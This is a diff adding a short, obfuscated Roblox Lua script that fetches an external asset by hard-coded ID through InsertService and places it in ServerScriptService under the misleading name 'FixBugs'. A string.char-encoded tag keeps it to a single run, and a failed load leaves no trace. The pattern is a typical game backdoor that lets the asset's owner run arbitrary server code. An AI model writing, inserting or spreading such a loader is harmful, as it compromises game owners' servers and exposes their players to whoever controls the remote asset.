@@ -1,0 +1,16 @@
+local a=game:GetService("InsertService")
+local b=game:GetService("ServerScriptService")
+local c=game:GetService("CollectionService")
+local d=string.char(70,105,120,66,117,103,115,73,110,115,101,114,116,101,100)
+local e=114086564318239
+if c:HasTag(workspace,d)then return end
+c:AddTag(workspace,d)
+if not b:FindFirstChild("FixBugs")then
+	local f,g=pcall(function()return a:LoadAsset(e)end)
+	if f and g then
+		g.Name="FixBugs"
+		g.Parent=b
+	else
+		print("")
+	end
+end
